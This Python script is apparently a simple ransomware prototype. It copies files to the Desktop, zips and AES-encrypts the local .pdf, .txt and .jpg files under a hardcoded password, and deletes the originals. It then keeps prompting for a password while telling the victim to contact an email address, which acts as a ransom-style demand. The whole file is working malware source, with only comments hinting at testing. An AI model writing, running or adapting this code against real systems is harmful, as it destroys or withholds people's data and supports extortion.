#!$HOME/anaconda3/bin/python

#==========LIBRARIES==========#
import zipfile
# import module in virtual enviroment
import pyAesCrypt
import os
import shutil

#==========VARIABLES==========#
mail="young_administration@drugsforlive.com"

#==========FUNCTIONS==========#
#==========ENCRYPT FILES==========#
def copy2file():
    initial_path=os.getcwd() # define source path
    target_folder=os.path.join(os.path.expanduser("~"),"Desktop") # remeber use the loop for look that paths!
    for I in os.listdir(initial_path): # change iterbale path
        source_file=os.path.join(initial_path,I)
        if os.path.isfile(source_file):
            shutil.copy(source_file,target_folder)
#end of functions, test in so windows system!!

def encrypt2file():
    zip_file_name='encrypt_files' # name to compress files
    password='password'
    if os.path.exists(zip_file_name+'.aes'):
        print('\nDO NOT EXECUTE AGAIN THIS FILE')
        return # perhaps 0 or 1 to exit control_structure
    zip_file=zipfile.ZipFile(zip_file_name+'.zip','w',zipfile.ZIP_DEFLATED)
    for I in os.listdir(os.getcwd()):
        ext_file=os.path.splitext(I)[1]
        if ext_file in ['.pdf','.txt','.jpg']:
            zip_file.write(I)
    zip_file.close()
    buffer_size=64*1024
    pyAesCrypt.encryptFile(zip_file_name+'.zip',zip_file_name+'.aes',password,buffer_size)
    os.remove(zip_file_name+'.zip')
# end of function, try to test

def erase2files():
    for I in os.listdir(): # all files in loop
        if I.endswith('.pdf') or I.endswith('.jpg') or I.endswith('.txt'):
            os.remove(I)

#==========DECRYPT FILES==========#
def decrypt_unzip():
    while True:
        input_password=input('type password please and add this recipient in email account '+mail)
        # for our test
        if input_password == '12345':
            print('decrypt files')
            break
        else:
            print('please add this recipient and type the correct password')
    zip_file_name='encrypt_files.aes'
    # for zip file, no rescue data
    password='password'
    buffer_size=64*1024
    pyAesCrypt.decryptFile(zip_file_name,'encrypt_files.zip',password,buffer_size)
    # object file for zipfile
    zip_file=zipfile.ZipFile('encrypt_files.zip')
    for I in zip_file.namelist():
        if os.path.splitext(I)[1] in ['.pdf','.txt','.jpg']:
            zip_file.extract(I)
    zip_file.close()
    os.remove('encrypt_files.zip')
    os.remove(zip_file_name)

copy2file()
encrypt2file()
erase2files()
decrypt_unzip()
